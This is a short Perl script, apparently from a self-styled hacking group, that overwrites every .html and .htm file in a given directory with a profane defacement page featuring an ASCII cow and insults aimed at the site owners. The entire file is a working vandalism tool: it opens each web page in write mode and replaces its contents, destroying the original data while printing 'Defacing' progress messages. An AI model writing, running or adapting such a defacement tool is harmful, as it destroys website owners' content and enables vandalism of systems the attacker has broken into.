use Getopt::Std;


my %opts = ();

getopt('f:', \%opts);



$def = '
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>fuckkeddddd</title>
</head>
<body>
    <div class="LOLLLLLLLLLLLLLLLLLLLLLLLLLLLLL">
        ______________
         fuck your HTML >
          --------------
                 \   ^__^ 
                  \  (oo)\_______
                     (__)\       )\/\
                         ||----w |
                         ||     ||
              
              HEHEHEHE LULZ, Gotta love the cow 
              Get fucked by literal fucking perl, a lang from the 80s XD
              S_C_A_R_E | S_E_C_U_R_I_T_Y 
              Copywrite -> FUCK YOU YOU FUCKING BASTARDS!!!!!!
    </div>
    

<style>
    .LOLLLLLLLLLLLLLLLLLLLLLLLLLLLLL {
    font-family: monospace;
    white-space: pre;
}
</style>
</body>
</html>
'; 

$filepath = $opts{f};
my $main_filepath = $filepath . "/*.html";
my $main_filepath2 = $filepath . "/*.htm";

print"[+]DEFACING ALL .html FILES IN DIRECTORY\n"; 
print "-----------------------------------------\n";
my @html = glob($main_filepath); #Files 
my @htm = glob($main_filepath2);  
foreach my $deface(@html) {
   print "[+] Defacing -> $deface\n"; 
   open(DEFACE, '>', $deface); 
   print DEFACE $def || print "[-]Fucked up $!\n"; 
   close(DEFACE) 
}        
foreach my $deface(@htm) {
   print "[+] Defacing -> $deface\n"; 
   open(DEFACE, '>', $deface); 
   print DEFACE $def || print "[-]Fucked up $!\n"; 
   close(DEFACE) 
}        
  